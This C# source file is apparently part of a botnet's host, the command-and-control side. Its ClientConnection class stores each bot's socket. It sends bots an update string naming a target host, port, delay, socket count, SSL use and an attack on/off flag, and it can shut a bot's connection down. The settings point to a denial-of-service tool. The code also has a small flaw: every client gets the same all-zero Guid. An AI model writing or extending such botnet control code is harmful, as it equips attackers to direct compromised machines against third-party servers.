using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BotnetHost
{
    class ClientConnection
    {
        // Client Variables
        public Boolean isAlive = true;
        public Thread clientThread;
        public Socket clientSocket;
        public Guid guid = new Guid();
        // Data Variables
        public string hostOrIP = "localhost";
        public int port = 12345;
        public int delay = 15000;
        public int sockets = 8;
        public Boolean useSSL = false;
        public Boolean attack = false;

        // Constructor
        public ClientConnection (Thread thread, Socket socket)
        {
            this.clientThread = thread;
            this.clientSocket = socket;
        }
        // Build update for client
        public string buildUpdate()
        {
            string output = "";
            output += "[IP: " + hostOrIP + "],";
            output += "[Port: " + port + "],";
            output += "[Delay: " + delay + "],";
            output += "[Sockets: " + sockets + "],";
            output += "[UseSSL: " + useSSL.ToString() + "],";
            output += "[Attack: " + attack.ToString() + "]";
            return output;
        }
        // Shutdown & Close Socket and Abort thread
        public void killClient()
        {
            isAlive = false;
            try
            {
                clientSocket.Shutdown(SocketShutdown.Both);
            } catch (Exception e)
            {
                Console.WriteLine("Error shutting down client socket: " + e.ToString());
            }
            try
            {
                clientSocket.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error closing client socket: " + e.ToString());
            }
            try
            {
                clientThread.Abort();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error aborting client thread: " + e.ToString());
            }
        }
    }
}
